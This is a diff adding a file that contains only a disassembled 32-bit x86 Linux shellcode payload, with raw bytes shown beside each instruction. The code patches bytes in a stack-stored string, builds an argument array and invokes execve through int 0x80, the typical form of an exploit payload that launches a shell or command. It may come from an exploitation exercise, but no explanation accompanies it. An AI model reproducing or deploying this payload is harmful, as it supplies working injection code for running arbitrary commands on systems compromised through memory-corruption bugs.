@@ -1,0 +1,32 @@
+
+
+   0:	31 c0                	xor    %eax,%eax
+   2:	83 c0 42             	add    $0x42,%eax
+   5:	83 c0 64             	add    $0x64,%eax
+   8:	c1 e0 02             	shl    $0x2,%eax
+   b:	83 c0 0a             	add    $0xa,%eax
+   e:	29 c4                	sub    %eax,%esp
+  10:	89 e0                	mov    %esp,%eax
+  12:	83 c0 1e             	add    $0x1e,%eax
+  15:	8a 18                	mov    (%eax),%bl
+  17:	80 eb 20             	sub    $0x20,%bl
+  1a:	88 18                	mov    %bl,(%eax)
+  1c:	83 c0 03             	add    $0x3,%eax
+  1f:	8a 18                	mov    (%eax),%bl
+  21:	80 eb 20             	sub    $0x20,%bl
+  24:	88 18                	mov    %bl,(%eax)
+  26:	89 e3                	mov    %esp,%ebx
+  28:	31 c0                	xor    %eax,%eax
+  2a:	50                   	push   %eax
+  2b:	89 e2                	mov    %esp,%edx
+  2d:	89 d8                	mov    %ebx,%eax
+  2f:	50                   	push   %eax
+  30:	83 c0 1f             	add    $0x1f,%eax
+  33:	50                   	push   %eax
+  34:	83 c0 03             	add    $0x3,%eax
+  37:	50                   	push   %eax
+  38:	8b 1c 24             	mov    (%esp),%ebx
+  3b:	89 e1                	mov    %esp,%ecx
+  3d:	31 c0                	xor    %eax,%eax
+  3f:	b0 0b                	mov    $0xb,%al
+  41:	cd 80                	int    $0x80
